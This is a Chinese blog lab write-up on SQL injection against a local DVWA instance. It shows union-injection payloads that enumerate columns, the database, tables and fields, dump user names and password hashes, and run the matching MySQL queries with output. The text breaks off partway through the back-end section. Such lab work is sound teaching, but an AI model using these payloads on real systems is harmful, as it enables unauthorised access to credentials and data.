<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>常见sql注入漏洞 - Daben's Blog</title><meta name=Description content="This is my cool site"><meta property="og:title" content="常见sql注入漏洞"><meta property="og:description" content="实验目的：
1、分别在前端和后端使用Union注入实现“dvwa数据库-user表-字段-first_name数据”的注入；
2、分别在前端和后端使用报错注入实现“dvwa数据库-user表-字段-first_name数据”的注入；
3、分别在前端和后端使用布尔盲注实现“库名-表名-列名”的注入；
4、利用宽字节注入实现“库名-表名-列名”的注入；
5、利用SQL注入获取DVWA站点的Getshell；
前端：DVWA，后端：MySQL"><meta property="og:type" content="article"><meta property="og:url" content="https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-25T22:40:51+08:00"><meta property="article:modified_time" content="2023-03-25T22:40:51+08:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary"><meta name=twitter:title content="常见sql注入漏洞"><meta name=twitter:description content="实验目的：
1、分别在前端和后端使用Union注入实现“dvwa数据库-user表-字段-first_name数据”的注入；
2、分别在前端和后端使用报错注入实现“dvwa数据库-user表-字段-first_name数据”的注入；
3、分别在前端和后端使用布尔盲注实现“库名-表名-列名”的注入；
4、利用宽字节注入实现“库名-表名-列名”的注入；
5、利用SQL注入获取DVWA站点的Getshell；
前端：DVWA，后端：MySQL"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/><link rel=prev href=https://senmer.github.io/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/><link rel=next href=https://senmer.github.io/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"常见sql注入漏洞","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/senmer.github.io\/posts\/sql_injection\/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/"},"genre":"posts","wordcount":5791,"url":"https:\/\/senmer.github.io\/posts\/sql_injection\/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/","datePublished":"2023-03-25T22:40:51+08:00","dateModified":"2023-03-25T22:40:51+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"作者"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?63ce39500f9db1110f1c08d9ed53fa96",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Daben's Blog">Daben's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Daben's Blog">Daben's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">常见sql注入漏洞</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>作者</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/sql_injection/><i class="far fa-folder fa-fw" aria-hidden=true></i>Sql_Injection</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-03-25>2023-03-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 5791 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 12 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1-实验环境>1 实验环境</a></li><li><a href=#2-union注入>2 Union注入</a><ul><li><a href=#21-前端注入>2.1 前端注入</a></li><li><a href=#22-后端注入><strong>2.2 后端注入：</strong></a></li></ul></li><li><a href=#3-报错注入>3 报错注入</a><ul><li><a href=#31-前端注入>3.1 前端注入</a></li><li><a href=#32-后端注入>3.2 后端注入</a></li></ul></li><li><a href=#4-布尔盲注>4 布尔盲注</a><ul><li><a href=#41-判断是否存在注入注入的类型>4.1 判断是否存在注入，注入的类型</a></li><li><a href=#41-猜解当前数据库名称-二分法>4.1 猜解当前数据库名称 （二分法）</a></li><li><a href=#43-拆解数据库中的表名>4.3 拆解数据库中的表名</a></li><li><a href=#44-猜解表中的字段名>4.4 猜解表中的字段名</a></li><li><a href=#45-获取表中的字段值>4.5 获取表中的字段值</a></li><li><a href=#45-后端注入>4.5 后端注入</a></li></ul></li><li><a href=#5-宽字节注入>5 宽字节注入</a></li><li><a href=#6-sql注入获取dvwa站点的getshell>6 SQL注入获取DVWA站点的Getshell</a><ul><li><a href=#参考链接>参考链接</a></li><li><a href=#附录>附录</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>实验目的：</p><p>1、分别在前端和后端使用Union注入实现“dvwa数据库-user表-字段-first_name数据”的注入；
2、分别在前端和后端使用报错注入实现“dvwa数据库-user表-字段-first_name数据”的注入；
3、分别在前端和后端使用布尔盲注实现“库名-表名-列名”的注入；
4、利用宽字节注入实现“库名-表名-列名”的注入；
5、利用SQL注入获取DVWA站点的Getshell；</p><p>前端：DVWA，后端：MySQL</p><h2 id=1-实验环境>1 实验环境</h2><table><thead><tr><th>软件名称</th><th>版本</th><th>部署方式</th><th>IP</th></tr></thead><tbody><tr><td>DVWA</td><td>latest</td><td>docker run -d -p 80:80 docker.io/sagikazarmark/dvwa</td><td>172.31.5.7</td></tr><tr><td>Pikachu</td><td>latest</td><td>docker run -d -p 8080:80 &ndash;name pikachu area39/pikachu</td><td>172.31.5.7</td></tr></tbody></table><h2 id=2-union注入>2 Union注入</h2><blockquote><p>使用DVWA SQL Injection模块，安全等级：Low</p></blockquote><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用UNION或UNION ALL。</p><p><strong>注意：UNION操作符选取不重复的值。如果允许重复的值，请使用 UNION ALL。</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=err>进入</span><span class=n>dvwa</span><span class=err>的数据库</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>docker</span><span class=w> </span><span class=k>exec</span><span class=w> </span><span class=o>-</span><span class=n>it</span><span class=w> </span><span class=n>dvwa</span><span class=w> </span><span class=n>bash</span><span class=w> </span><span class=o>-</span><span class=k>c</span><span class=w> </span><span class=s1>&#39;mysql -uroot&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>use</span><span class=w> </span><span class=n>dvwa</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=k>union</span><span class=w> </span><span class=n>all</span><span class=err>查询</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>user_id</span><span class=p>,</span><span class=n>first_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>all</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>user_id</span><span class=p>,</span><span class=n>first_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------+------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------+------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>       </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>       </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------+------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>2</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=n>union</span><span class=err>查询</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>user_id</span><span class=p>,</span><span class=n>first_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>user_id</span><span class=p>,</span><span class=n>first_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------+------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------+------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>       </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------+------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><p><strong>使用union查询的前提：页面上有显示位。否则结果无法显示</strong></p><h3 id=21-前端注入>2.1 前端注入</h3><h4 id=211-获取列数>2.1.1 获取列数</h4><p>注入语句：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; order by 2 #
</span></span></span></code></pre></div><p>成功执行</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326150305597.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326150305597.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326150305597.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326150305597.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326150305597.png title=image-20230326150305597></p><p>注入语句：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; order by 3 #
</span></span></span></code></pre></div><p>注入失败，因此可知注入点列数为2</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151001042.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151001042.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151001042.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151001042.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326151001042.png title=image-20230326151001042></p><h4 id=212-获取数据库名和版本>2.1.2 获取数据库名和版本</h4><p>注入语句：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; union select database(),version() #
</span></span></span></code></pre></div><p>当前查询的数据库为dvwa</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151853408.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151853408.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151853408.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326151853408.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326151853408.png title=image-20230326151853408></p><h4 id=213-获得dvwa库中的所有表>2.1.3 获得dvwa库中的所有表</h4><blockquote><p>GROUP_CONCAT()函数将组中的字符串连接成为单个字符串。</p></blockquote><p>注入语句：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;</span><span class=n>dvwa</span><span class=s1>&#39; #
</span></span></span></code></pre></div><p>dvwa数据库中有两张表：guestbook, users</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160518477.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160518477.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160518477.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160518477.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326160518477.png title=image-20230326160518477></p><h4 id=214-获取users表中的字段>2.1.4 获取users表中的字段</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; union select 1, group_concat(column_name) from information_schema.columns where table_schema=&#39;</span><span class=n>dvwa</span><span class=s1>&#39; and table_name=&#39;</span><span class=n>users</span><span class=s1>&#39; #
</span></span></span></code></pre></div><p>users表中有first_name、password字段</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160832827.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160832827.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160832827.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326160832827.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326160832827.png title=image-20230326160832827></p><h4 id=215-获取first_namepassword字段值>2.1.5 获取first_name、password字段值</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; union select user,password from users #
</span></span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326161130275.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326161130275.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326161130275.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326161130275.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326161130275.png title=image-20230326161130275></p><h3 id=22-后端注入><strong>2.2 后端注入：</strong></h3><h4 id=221-通过查看源码拿到查询语句>2.2.1 通过查看源码拿到查询语句</h4><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326153359535.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326153359535.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326153359535.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326153359535.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326153359535.png title=image-20230326153359535></p><h4 id=222-注入过程>2.2.2 注入过程：</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=err>进入</span><span class=n>dvwa</span><span class=err>数据库</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=n>use</span><span class=w> </span><span class=n>dvwa</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Database</span><span class=w> </span><span class=n>changed</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>获得列数</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>3</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1054</span><span class=w> </span><span class=p>(</span><span class=mi>42</span><span class=n>S22</span><span class=p>):</span><span class=w> </span><span class=k>Unknown</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=s1>&#39;3&#39;</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=s1>&#39;order clause&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>获得数据库名及版本号</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;1 union select database(),version() #&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=n>warning</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>获得所有表</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;dvwa&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w>       </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>           </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w>          </span><span class=o>|</span><span class=w> </span><span class=n>guestbook</span><span class=p>,</span><span class=n>users</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+-----------------+
